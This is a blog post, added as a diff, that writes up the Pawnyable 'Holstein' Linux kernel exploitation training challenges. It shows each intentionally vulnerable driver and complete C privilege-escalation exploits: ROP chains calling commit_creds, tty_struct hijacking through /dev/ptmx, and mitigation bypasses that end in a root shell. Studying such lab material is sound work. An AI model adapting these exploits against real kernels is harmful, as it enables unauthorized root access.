@@ -1,0 +1,1015 @@
+---
+title: Pawnyable Linux Kernel Exploitation series
+date: 2023-12-24
+postLayout: simple
+tags:
+- "linux"
+- "kernel"
+- "use-after-free"
+- "race-condition"
+- "rop"
+- "heap"
+---
+
+# Introduction
+
+<a href="https://pawnyable.cafe/">Pawnyable</a> presents a series of challenges including Linux Kernel Exploitation which we are going through. These challenges are created by <a href="https://twitter.com/ptrYudai">@ptr_yudai</a>. In the Linux Kernel Exploitation chapter we discuss various kernel exploitation techniques so called Privilege Escalation.
+
+## Holstein 1
+
+```c
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/cdev.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+#include <linux/slab.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("ptr-yudai");
+MODULE_DESCRIPTION("Holstein v1 - Vulnerable Kernel Driver for Pawnyable");
+
+#define DEVICE_NAME "holstein"
+#define BUFFER_SIZE 0x400
+
+char *g_buf = NULL;
+
+static int module_open(struct inode *inode, struct file *file)
+{
+  printk(KERN_INFO "module_open called\n");
+
+  g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
+  if (!g_buf) {
+    printk(KERN_INFO "kmalloc failed");
+    return -ENOMEM;
+  }
+
+  return 0;
+}
+
+static ssize_t module_read(struct file *file,
+                        char __user *buf, size_t count,
+                        loff_t *f_pos)
+{
+  char kbuf[BUFFER_SIZE] = { 0 };
+
+  printk(KERN_INFO "module_read called\n");
+
+  memcpy(kbuf, g_buf, BUFFER_SIZE);
+  if (_copy_to_user(buf, kbuf, count)) {
+    printk(KERN_INFO "copy_to_user failed\n");
+    return -EINVAL;
+  }
+
+  return count;
+}
+
+static ssize_t module_write(struct file *file,
+                            const char __user *buf, size_t count,
+                            loff_t *f_pos)
+{
+  char kbuf[BUFFER_SIZE] = { 0 };
+
+  printk(KERN_INFO "module_write called\n");
+
+  if (_copy_from_user(kbuf, buf, count)) {
+    printk(KERN_INFO "copy_from_user failed\n");
+    return -EINVAL;
+  }
+  memcpy(g_buf, kbuf, BUFFER_SIZE);
+
+  return count;
+}
+
+static int module_close(struct inode *inode, struct file *file)
+{
+  printk(KERN_INFO "module_close called\n");
+  kfree(g_buf);
+  return 0;
+}
+
+static struct file_operations module_fops =
+  {
+   .owner   = THIS_MODULE,
+   .read    = module_read,
+   .write   = module_write,
+   .open    = module_open,
+   .release = module_close,
+  };
+
+static dev_t dev_id;
+static struct cdev c_dev;
+
+static int __init module_initialize(void)
+{
+  if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME)) {
+    printk(KERN_WARNING "Failed to register device\n");
+    return -EBUSY;
+  }
+
+  cdev_init(&c_dev, &module_fops);
+  c_dev.owner = THIS_MODULE;
+
+  if (cdev_add(&c_dev, dev_id, 1)) {
+    printk(KERN_WARNING "Failed to add cdev\n");
+    unregister_chrdev_region(dev_id, 1);
+    return -EBUSY;
+  }
+
+  return 0;
+}
+
+static void __exit module_cleanup(void)
+{
+  cdev_del(&c_dev);
+  unregister_chrdev_region(dev_id, 1);
+}
+
+module_init(module_initialize);
+module_exit(module_cleanup);
+```
+
+### Bug 
+
+In `Holstein v1` there is no check on the size of data being read or written to kernel stack buffer `kbuf` during the call to `memcpy` making it vulnerabile to stack buffer overflow.
+
+### Exploit
+
+This vulnerability allows attackers to perform out-of-bounds read and out-of-bounds write access on the kernel stack. The attackers can perform stack buffer overflow and trigger a ROP chain attack to perform `commit_creds(prepare_kerel_creds(0))` changing the UID of the current user to root and returning to userland bypassing kernel exploit mitigations such as the
+- kaslr
+- kpti
+- smap
+- smep
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <unistd.h> 
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <sys/mman.h>
+#include <linux/userfaultfd.h>
+#include <poll.h>
+#include <pthread.h>
+#include <signal.h>
+#include <sys/prctl.h>
+#include <sys/stat.h>
+#include <sys/auxv.h> 
+
+int unsigned long exploit[0x1000];
+int unsigned long leak[0x1000];
+uint64_t counter = 0;
+
+size_t commit_creds, prepare_kernel_cred, kernel_base;
+size_t user_cs, user_ss, user_sp, user_rflags;
+
+void loglx(uint64_t num,char *tag){
+    printf("[lx] ");
+    printf(" %-20s ",tag);
+    printf(": %-#16lx\n",num);
+}
+
+void wait(){
+    char a;
+    puts("[*] Waiting for user input ... ");
+    getc(stdin);
+}
+
+void save_state()
+{
+    __asm__(
+        "mov user_cs,cs;" 
+        "mov user_sp,rsp;"
+        "mov user_ss,ss;"
+        "pushf;"           
+        "pop user_rflags;" 
+
+    );
+}
+
+void getshell()
+{
+    char *argv[] = {"/bin/sh",  NULL};
+  	syscall(__NR_setuid, 0);
+  	syscall(__NR_execve, "/bin/sh", argv, 0);
+  	syscall(__NR_exit, 0);
+}
+__attribute__((naked)) void tramp(){
+    __asm__(
+        "mov rsp, 0x5001000;"
+        "jmp getshell;"
+    );
+}
+void *SHELL=tramp;
+void sudo()
+{
+    void *(*pre)(int) = prepare_kernel_cred; 
+    int (*cc)(void *) = commit_creds;
+    (*cc)((*pre)(0));
+    __asm__(
+        "push user_ss;"
+        "push user_sp;"
+        "push user_rflags;"
+        "push user_cs;"
+        "push SHELL;"
+        "push 0;"
+        "swapgs;"
+        "pop rbp;"
+        "iretq;"
+    );
+}
+
+int fd = 0;
+
+void get_device(){
+    fd = open("/dev/holstein", O_RDWR);
+    if (fd < 0){
+        puts("[!] Failed to open device");
+    } else {
+        puts("[*] Opened device");
+    }
+}
+
+int do_ioctl(int cmd, int arg){
+    return ioctl(fd, cmd, arg);
+}
+
+int do_write(char * buffer, int size){
+    return write(fd, buffer, size);
+}
+
+int do_read(char * buffer, int size){
+    return read(fd, buffer, size);
+}
+
+#define BUFFER_SIZE 0x400
+
+int main()
+{
+    int i;
+    mmap((void*)0x5000000,0x2000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE |MAP_ANON|MAP_FIXED | MAP_POPULATE , 0 , 0 );
+
+    setvbuf(stdout,0,2,0);
+    signal(SIGSEGV,SHELL);    
+    save_state();
+
+    get_device();
+    
+    do_read(leak, 0x1000); // Out of bounds read on kernel stack buffer to get kernel heap and stack leak
+
+    size_t kheap = leak[128];
+    kernel_base = leak[129]-1299260;
+    unsigned long user_rip = (unsigned long)getshell;
+
+    loglx(kheap, "KERNEL HEAP");
+    loglx(kernel_base, "KERNEL BASE");
+
+    unsigned off = 0x81; // RIP offset
+    exploit[off]   = kernel_base + ( 0xffffffff81028364 - 0xffffffff81000000 ); // ret
+    exploit[off++] = kernel_base + ( 0xffffffff8127bbdc - 0xffffffff81000000 ); // pop rdi
+    exploit[off++] = 0x0;
+    exploit[off++] = kernel_base + ( 0xffffffff8106e240 - 0xffffffff81000000 ); // prepare_kernel_creds
+    exploit[off++] = kernel_base + ( 0xffffffff81146092 - 0xffffffff81000000 ); // pop rdx; ret
+    exploit[off++] = 0xc0;
+    exploit[off++] = kernel_base + ( 0xffffffff814d47f8 - 0xffffffff81000000 ); // mov rdx, rax
+    exploit[off++] = kernel_base + ( 0xffffffff8101ccde - 0xffffffff81000000 ); // pop rsi
+    exploit[off++] = kernel_base + ( 0xffffffff8101ccde - 0xffffffff81000000 ); // ret
+    exploit[off++] = kernel_base + ( 0xffffffff81800f9a - 0xffffffff81000000 ); // mov rdi, rdx
+    exploit[off++] = kernel_base + ( 0xffffffff8106e390 - 0xffffffff81000000 ); // commit creds
+    exploit[off++] = kernel_base + ( 0xffffffff81800e26 - 0xffffffff81000000 ); // kpti_trampoline
+    exploit[off++] = 0x0;
+    exploit[off++] = 0x0;
+    exploit[off++] = user_rip;
+    exploit[off++] = user_cs;
+    exploit[off++] = user_rflags;
+    exploit[off++] = user_sp;
+    exploit[off++] = user_ss;
+
+    do_write(exploit, 0x500); // Stack overflow triggering rop chain attack and drop root shell
+
+    return 0;
+}
+```
+<img 
+  alt="Holstein 2" 
+  src="/src/assets/lk01.png" 
+/>
+
+## Holstein 2
+
+```c
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/cdev.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+#include <linux/slab.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("ptr-yudai");
+MODULE_DESCRIPTION("Holstein v2 - Vulnerable Kernel Driver for Pawnyable");
+
+#define DEVICE_NAME "holstein"
+#define BUFFER_SIZE 0x400
+
+char *g_buf = NULL;
+
+static int module_open(struct inode *inode, struct file *file)
+{
+  printk(KERN_INFO "module_open called\n");
+
+  g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
+  if (!g_buf) {
+    printk(KERN_INFO "kmalloc failed");
+    return -ENOMEM;
+  }
+
+  return 0;
+}
+
+static ssize_t module_read(struct file *file,
+                           char __user *buf, size_t count,
+                           loff_t *f_pos)
+{
+  printk(KERN_INFO "module_read called\n");
+
+  if (copy_to_user(buf, g_buf, count)) {
+    printk(KERN_INFO "copy_to_user failed\n");
+    return -EINVAL;
+  }
+
+  return count;
+}
+
+static ssize_t module_write(struct file *file,
+                            const char __user *buf, size_t count,
+                            loff_t *f_pos)
+{
+  printk(KERN_INFO "module_write called\n");
+
+  if (copy_from_user(g_buf, buf, count)) {
+    printk(KERN_INFO "copy_from_user failed\n");
+    return -EINVAL;
+  }
+
+  return count;
+}
+
+static int module_close(struct inode *inode, struct file *file)
+{
+  printk(KERN_INFO "module_close called\n");
+  kfree(g_buf);
+  return 0;
+}
+
+static struct file_operations module_fops =
+  {
+   .owner   = THIS_MODULE,
+   .read    = module_read,
+   .write   = module_write,
+   .open    = module_open,
+   .release = module_close,
+  };
+
+static dev_t dev_id;
+static struct cdev c_dev;
+
+static int __init module_initialize(void)
+{
+  if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME)) {
+    printk(KERN_WARNING "Failed to register device\n");
+    return -EBUSY;
+  }
+
+  cdev_init(&c_dev, &module_fops);
+  c_dev.owner = THIS_MODULE;
+
+  if (cdev_add(&c_dev, dev_id, 1)) {
+    printk(KERN_WARNING "Failed to add cdev\n");
+    unregister_chrdev_region(dev_id, 1);
+    return -EBUSY;
+  }
+
+  return 0;
+}
+
+static void __exit module_cleanup(void)
+{
+  cdev_del(&c_dev);
+  unregister_chrdev_region(dev_id, 1);
+}
+
+module_init(module_initialize);
+module_exit(module_cleanup);
+```
+
+### Bug
+
+1. The kernel driver does not have a mutex lock allowing multiple file descriptors to communicate with the kernel driver simultaneously.
+2. The kernel driver also has a Use-After-Free bug. When the `module_close()` function is called the driver free's `g_buf` and doesn't change the `g_buf` to NULL leading to a Use-After-Free vulnerability.
+3. The kernel driver also has a heap overflow bug as there are no checks performed when passing the user controlled size to `copy_to_user()` or `copy_from_user()` function leading to a kernel heap buffer overflow.
+
+### Exploit
+
+This can be exploited in this following way. The exploit also doesn't require heap buffer overflow.
+
+| fd1                                                                                	| fd2                                                                   	|
+|------------------------------------------------------------------------------------	|-----------------------------------------------------------------------	|
+| open("/dev/holstein");                                                             	| open("/dev/holstein");                                                	|
+|                                                                                    	| close(fd2); // g_buf is now freed                                     	|
+|                                                                                    	| open("/dev/ptmx"); // tty_struct is allocated to the address of g_buf 	|
+| read(fd1, leak, 0x400); // now the contents of tty_struct is read into leak buffer 	|                                                                       	|
+| close(fd1); // g_buf containing the tty_struct is freed                            	|                                                                       	|
+| open("/dev/holstein"); // g_buf reallocated                                        	| open("/dev/holstein");                                                	|
+|                                                                                    	| close(fd2);                                                           	|
+|                                                                                    	| victim = open("/dev/ptmx"); //tty_struct allocated to g_buf           	|
+| write(fd1, exploit, 0x400); // overwrite tty_struct->fops to a fake vtable         	|                                                                       	|
+| ioctl(ptmx, 0x4141414141414141, ROP_CHAIN_ADDR // trigger ROP and get shell        	|                                                                       	|
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <inttypes.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <unistd.h> 
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <sys/mman.h>
+#include <linux/userfaultfd.h>
+#include <poll.h>
+#include <pthread.h>
+#include <signal.h>
+#include <sys/prctl.h>
+#include <sys/stat.h>
+#include <sys/auxv.h> 
+
+int unsigned long exploit[0x1000];
+int unsigned long leak[0x1000];
+uint64_t counter = 0;
+
+#define TTY_STRUCT_MAGIC 0x0000000100005401
+
+size_t commit_creds, prepare_kernel_cred, kernel_base, tty_struct;
+size_t user_cs, user_ss, user_sp, user_rflags;
+
+void loglx(uint64_t num,char *tag){
+    printf("[lx] ");
+    printf(" %-20s ",tag);
+    printf(": %-#16lx\n",num);
+}
+
+void wait(){
+    char a;
+    puts("[*] Waiting for user input ... ");
+    getc(stdin);
+}
+
+void save_state()
+{
+    __asm__(
+        "mov user_cs,cs;" 
+        "mov user_sp,rsp;"
+        "mov user_ss,ss;"
+        "pushf;"           
+        "pop user_rflags;" 
+
+    );
+}
+void getshell()
+{
+    char *argv[] = {"/bin/sh",  NULL};
+  	syscall(__NR_setuid, 0);
+  	syscall(__NR_execve, "/bin/sh", argv, 0);
+  	syscall(__NR_exit, 0);
+}
+__attribute__((naked)) void tramp(){
+    __asm__(
+        "mov rsp, 0x5001000;"
+        "jmp getshell;"
+    );
+}
+void *SHELL=tramp;
+void sudo()
+{
+    void *(*pre)(int) = prepare_kernel_cred; 
+    int (*cc)(void *) = commit_creds;
+    (*cc)((*pre)(0));
+    __asm__(
+        "push user_ss;"
+        "push user_sp;"
+        "push user_rflags;"
+        "push user_cs;"
+        "push SHELL;"
+        "push 0;"
+        "swapgs;"
+        "pop rbp;"
+        "iretq;"
+    );
+}
+
+int fd, fd1 = 0;
+
+int get_device(){
+    int tmp_fd;
+    tmp_fd = open("/dev/holstein", O_RDWR);
+    if (tmp_fd < 0){
+        puts("[!] Failed to open device");
+    } else {
+        printf("[*] Opened device %x\n", tmp_fd);
+    }
+    return tmp_fd;
+}
+
+int do_ioctl(int cmd, int arg){
+    return ioctl(fd, cmd, arg);
+}
+
+int do_write(char * buffer, int size){
+    printf("[*] write %x\n", fd);
+    return write(fd, buffer, size);
+}
+
+int do_read(char * buffer, int size){
+    return read(fd, buffer, size);
+}
+
+void leak_kbase(int size)
+{
+
+    do_read(leak, size);
+
+    unsigned int off=0;
+    for (int i = 0; i < size; ++i)
+    {
+
+        uint64_t value = *(uint64_t *)&leak[i];
+        if ((value&0xfffff) == 0x38880)    // kbase
+        {
+            printf("\x1b[31m[%d : 0x%.3x] 0x%.16" PRIx64 "\x1b[0m\n", off, i, value);
+            kernel_base = value - 0xc38880;
+            break;
+        }
+    }
+}
+
+size_t get_gadget(unsigned long int addr)
+{
+    return kernel_base + ( addr - 0xffffffff81000000 );
+}
+
+#define BUFFER_SIZE 0x400
+
+int main()
+{
+    int i;
+    unsigned long user_rip = (unsigned long)getshell;
+    mmap((void*)0x5000000,0x2000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE |MAP_ANON|MAP_FIXED | MAP_POPULATE , 0 , 0 );
+    setvbuf(stdout,0,2,0);
+    signal(SIGSEGV,SHELL);    
+    save_state();
+    
+    fd = get_device();
+    int tmp = get_device();
+    close(tmp);
+    int ptmx = open("/dev/ptmx",O_RDWR);
+
+    leak_kbase(0x1000);
+    loglx(kernel_base, "KERNEL BASE");
+    close(fd);
+
+    fd = get_device();
+    tmp = get_device();
+    close(tmp);
+
+    ptmx = open("/dev/ptmx",O_RDWR);
+
+    prepare_kernel_cred = get_gadget(0xffffffff81074650);
+    commit_creds = get_gadget(0xffffffff810744b0);
+
+    do_read(exploit, (0x5b +  8 )*8);
+
+    telescope(exploit, (0x5b +  8 )*8);
+
+    tty_struct = exploit[31]-0xf8;
+
+
+    printf("tty_struct : 0x%lx\n", tty_struct);
+    printf("tty_fake_ops : 0x%lx\n", tty_struct+0x2d0);
+    printf("ROP chain : 0x%lx\n", tty_struct+0x338);
+
+    exploit[3]  = tty_struct+0x2d0;
+
+    int off = 0x2d0/8 + (0x60/8);
+
+    exploit[off++]  = get_gadget(0xffffffff811077fb);
+
+    size_t pop_rdi, pop_rax, pop_rdx, cmp_rdx, mov_rdi_rax, kpti_trampoline, mov_rsi_rax, mov_rdi_rsi;
+
+    mov_rsi_rax = get_gadget(0xffffffff8151a3bf);
+    mov_rdi_rsi = get_gadget(0xffffffff8139826b);
+    pop_rdi = get_gadget(0xffffffff810d748d);
+    pop_rax = get_gadget(0xffffffff81025261);
+    pop_rdx = get_gadget(0xffffffff8113c0da);
+    mov_rdi_rax = get_gadget(0xffffffff8129628e);       // 0xffffffff8129628e: mov rdi, rax; cmp rdi, rdx; jne short 0xffffffff81296285; xor eax, eax; ret 
+    kpti_trampoline = get_gadget(0xffffffff81800e26);
+    cmp_rdx = get_gadget(0xffffffff81008420);           // 0xffffffff81008420: cmp rdx, 0x3c; je short 0xffffffff81008427; ret; 
+
+
+    exploit[off++] = get_gadget(0xffffffff810001fc); // ret
+    exploit[off++] = get_gadget(0xffffffff810001fc); // ret
+    exploit[off++] = get_gadget(0xffffffff810001fc); // ret
+    exploit[off++] = pop_rdi; // return address
+    exploit[off++] = 0x0; // rdi <- 0
+    exploit[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
+    exploit[off++] = pop_rdx;
+    exploit[off++] = 0xdeadbeef; // rdx <- 8
+    exploit[off++] = cmp_rdx; // make sure JNE doesn't branch
+    exploit[off++] = mov_rsi_rax;
+    exploit[off++] = 0x0; // dummy
+    exploit[off++] = 0x0; // dummy
+    exploit[off++] = 0x0; // dummy
+    exploit[off++] = mov_rdi_rsi;
+    exploit[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
+    exploit[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
+    exploit[off++] = 0x0; // dummy rax
+    exploit[off++] = 0x0; // dummy rdi
+    exploit[off++] = user_rip;
+    exploit[off++] = user_cs;
+    exploit[off++] = user_rflags;
+    exploit[off++] = user_sp;
+    exploit[off++] = user_ss;
+    
+    do_write(exploit, 0x500 );
+
+    usleep(0.5e6);
+
+    wait();
+
+    ioctl(ptmx, 0x4141414141414141, tty_struct+0x338); // trigger ROP chain drop root shell
+
+    return 0;
+}
+```
+<img 
+  alt="Holstein 2" 
+  src="/src/assets/lk02.png" 
+/>
+
+## Holstein 3
+
+```c
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/cdev.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+#include <linux/slab.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("ptr-yudai");
+MODULE_DESCRIPTION("Holstein v3 - Vulnerable Kernel Driver for Pawnyable");
+
+#define DEVICE_NAME "holstein"
+#define BUFFER_SIZE 0x400
+
+char *g_buf = NULL;
+
+static int module_open(struct inode *inode, struct file *file)
+{
+  printk(KERN_INFO "module_open called\n");
+
+  g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);
+  if (!g_buf) {
+    printk(KERN_INFO "kmalloc failed");
+    return -ENOMEM;
+  }
+
+  return 0;
+}
+
+static ssize_t module_read(struct file *file,
+                           char __user *buf, size_t count,
+                           loff_t *f_pos)
+{
+  printk(KERN_INFO "module_read called\n");
+
+  if (count > BUFFER_SIZE) {
+    printk(KERN_INFO "invalid buffer size\n");
+    return -EINVAL;
+  }
+
+  if (copy_to_user(buf, g_buf, count)) {
+    printk(KERN_INFO "copy_to_user failed\n");
+    return -EINVAL;
+  }
+
+  return count;
+}
+
+static ssize_t module_write(struct file *file,
+                            const char __user *buf, size_t count,
+                            loff_t *f_pos)
+{
+  printk(KERN_INFO "module_write called\n");
+
+  if (count > BUFFER_SIZE) {
+    printk(KERN_INFO "invalid buffer size\n");
+    return -EINVAL;
+  }
+
+  if (copy_from_user(g_buf, buf, count)) {
+    printk(KERN_INFO "copy_from_user failed\n");
+    return -EINVAL;
+  }
+
+  return count;
+}
+
+static int module_close(struct inode *inode, struct file *file)
+{
+  printk(KERN_INFO "module_close called\n");
+  kfree(g_buf);
+  return 0;
+}
+
+static struct file_operations module_fops =
+  {
+   .owner   = THIS_MODULE,
+   .read    = module_read,
+   .write   = module_write,
+   .open    = module_open,
+   .release = module_close,
+  };
+
+static dev_t dev_id;
+static struct cdev c_dev;
+
+static int __init module_initialize(void)
+{
+  if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME)) {
+    printk(KERN_WARNING "Failed to register device\n");
+    return -EBUSY;
+  }
+
+  cdev_init(&c_dev, &module_fops);
+  c_dev.owner = THIS_MODULE;
+
+  if (cdev_add(&c_dev, dev_id, 1)) {
+    printk(KERN_WARNING "Failed to add cdev\n");
+    unregister_chrdev_region(dev_id, 1);
+    return -EBUSY;
+  }
+
+  return 0;
+}
+
+static void __exit module_cleanup(void)
+{
+  cdev_del(&c_dev);
+  unregister_chrdev_region(dev_id, 1);
+}
+
+module_init(module_initialize);
+module_exit(module_cleanup);
+```
+
+### Bug
+
+The same challenge as Holstein 2 except the heap buffer overflow is patched by checking the size passed to the read and write functions of the driver before calling the `copy_to_user()` or `copy_from_user()` functions. 
+
+### Exploit
+
+The same exploit as Holstein 2.
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <inttypes.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <unistd.h> 
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <sys/mman.h>
+#include <linux/userfaultfd.h>
+#include <poll.h>
+#include <pthread.h>
+#include <signal.h>
+#include <sys/prctl.h>
+#include <sys/stat.h>
+#include <sys/auxv.h> 
+
+int unsigned long exploit[0x1000];
+int unsigned long leak[0x1000];
+uint64_t counter = 0;
+
+#define TTY_STRUCT_MAGIC 0x0000000100005401
+
+size_t commit_creds, prepare_kernel_cred, kernel_base, tty_struct;
+size_t user_cs, user_ss, user_sp, user_rflags;
+
+void loglx(uint64_t num,char *tag){
+    printf("[lx] ");
+    printf(" %-20s ",tag);
+    printf(": %-#16lx\n",num);
+}
+
+void wait(){
+    char a;
+    puts("[*] Waiting for user input ... ");
+    getc(stdin);
+}
+
+void save_state()
+{
+    __asm__(
+        "mov user_cs,cs;" 
+        "mov user_sp,rsp;"
+        "mov user_ss,ss;"
+        "pushf;"           
+        "pop user_rflags;" 
+
+    );
+}
+void getshell()
+{
+    char *argv[] = {"/bin/sh",  NULL};
+  	syscall(__NR_setuid, 0);
+  	syscall(__NR_execve, "/bin/sh", argv, 0);
+  	syscall(__NR_exit, 0);
+}
+__attribute__((naked)) void tramp(){
+    __asm__(
+        "mov rsp, 0x5001000;"
+        "jmp getshell;"
+    );
+}
+void *SHELL=tramp;
+void sudo()
+{
+    void *(*pre)(int) = prepare_kernel_cred; 
+    int (*cc)(void *) = commit_creds;
+    (*cc)((*pre)(0));
+    __asm__(
+        "push user_ss;"
+        "push user_sp;"
+        "push user_rflags;"
+        "push user_cs;"
+        "push SHELL;"
+        "push 0;"
+        "swapgs;"
+        "pop rbp;"
+        "iretq;"
+    );
+}
+
+int fd, fd1 = 0;
+
+int get_device(){
+    int tmp_fd;
+    tmp_fd = open("/dev/holstein", O_RDWR);
+    if (tmp_fd < 0){
+        puts("[!] Failed to open device");
+    } else {
+        printf("[*] Opened device %x\n", tmp_fd);
+    }
+    return tmp_fd;
+}
+
+int do_ioctl(int cmd, int arg){
+    return ioctl(fd, cmd, arg);
+}
+
+int do_write(char * buffer, int size){
+    printf("[*] write %x\n", fd);
+    return write(fd, buffer, size);
+}
+
+int do_read(char * buffer, int size){
+    return read(fd, buffer, size);
+}
+
+void leak_kbase(int size)
+{
+
+    do_read(leak, size);
+
+    unsigned int off=0;
+    for (int i = 0; i < size; ++i)
+    {
+
+        uint64_t value = *(uint64_t *)&leak[i];
+        if ((value&0xfffff) == 0x38880)    // kbase
+        {
+            printf("\x1b[31m[%d : 0x%.3x] 0x%.16" PRIx64 "\x1b[0m\n", off, i, value);
+            kernel_base = value - 0xc38880;
+            break;
+        }
+    }
+}
+
+size_t get_gadget(unsigned long int addr)
+{
+    return kernel_base + ( addr - 0xffffffff81000000 );
+}
+
+#define BUFFER_SIZE 0x400
+
+int main()
+{
+    int i;
+    unsigned long user_rip = (unsigned long)getshell;
+    mmap((void*)0x5000000,0x2000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE |MAP_ANON|MAP_FIXED | MAP_POPULATE , 0 , 0 );
+    setvbuf(stdout,0,2,0);
+    signal(SIGSEGV,SHELL);    
+    save_state();
+    
+    fd = get_device();
+    int tmp = get_device();
+    close(tmp);
+    int ptmx = open("/dev/ptmx",O_RDWR);
+
+    leak_kbase(0x400);
+    loglx(kernel_base, "KERNEL BASE");
+    close(fd);
+
+    fd = get_device();
+    tmp = get_device();
+    close(tmp);
+
+    ptmx = open("/dev/ptmx",O_RDWR);
+
+    do_read(exploit, (0x5b +  8 )*8);
+
+    tty_struct = exploit[31]-0xf8;
+
+
+    printf("tty_struct : 0x%lx\n", tty_struct);
+    printf("tty_fake_ops : 0x%lx\n", tty_struct+0x2d0);
+
+    exploit[3]  = tty_struct+0x2d0;
+
+    int off = 0x2d0/8 + (0x60/8);
+
+    exploit[off++]  = get_gadget(0xffffffff8114fbea);
+
+    size_t pop_rdi, pop_rax, pop_rdx, cmp_rdx, mov_rdi_rax, kpti_trampoline, mov_rdi_rsi, mov_rsi_rax;
+
+    prepare_kernel_cred = get_gadget(0xffffffff81072560);
+    commit_creds = get_gadget(0xffffffff810723c0);
+    pop_rdi = get_gadget(0xffffffff8114078a);
+    pop_rax = get_gadget(0xffffffff81136c1a);
+    pop_rdx = get_gadget(0xffffffff81145369);
+    mov_rdi_rax = get_gadget(0xffffffff812988fe);       // 0xffffffff8129628e: mov rdi, rax; cmp rdi, rdx; jne short 0xffffffff81296285; xor eax, eax; ret
+    mov_rdi_rsi = get_gadget(0xffffffff814b6693);
+    mov_rsi_rax = get_gadget(0xffffffff8152447f);
+    kpti_trampoline = get_gadget(0xffffffff81800e26);
+    cmp_rdx = get_gadget(0xffffffff81008420);           // 0xffffffff81008420: cmp rdx, 0x3c; je short 0xffffffff81008427; ret; 
+
+
+    exploit[off++] = get_gadget(0xffffffff8154cf1a); // ret
+    exploit[off++] = get_gadget(0xffffffff8154cf1a); // ret
+    exploit[off++] = get_gadget(0xffffffff8154cf1a); // ret
+    exploit[off++] = pop_rdi; // return address
+    exploit[off++] = 0x0; // rdi <- 0
+    exploit[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
+    exploit[off++] = mov_rsi_rax;
+    exploit[off++] = 0x0; // dummy
+    exploit[off++] = 0x0; // dummy
+    exploit[off++] = 0x0; // dummy
+    exploit[off++] = mov_rdi_rsi;
+    exploit[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
+    exploit[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
+    exploit[off++] = 0x0; // dummy rax
+    exploit[off++] = 0x0; // dummy rdi
+    exploit[off++] = user_rip;
+    exploit[off++] = user_cs;
+    exploit[off++] = user_rflags;
+    exploit[off++] = user_sp;
+    exploit[off++] = user_ss;
+
+    
+    do_write(exploit, 0x400 );
+
+    usleep(0.5e6);
+
+    wait();
+
+    ioctl(ptmx, 0x4141414141414141, tty_struct+0x338);
+
+    return 0;
+}
+```
+<img 
+  alt="Holstein 3" 
+  src="/src/assets/lk03.png" 
+/>
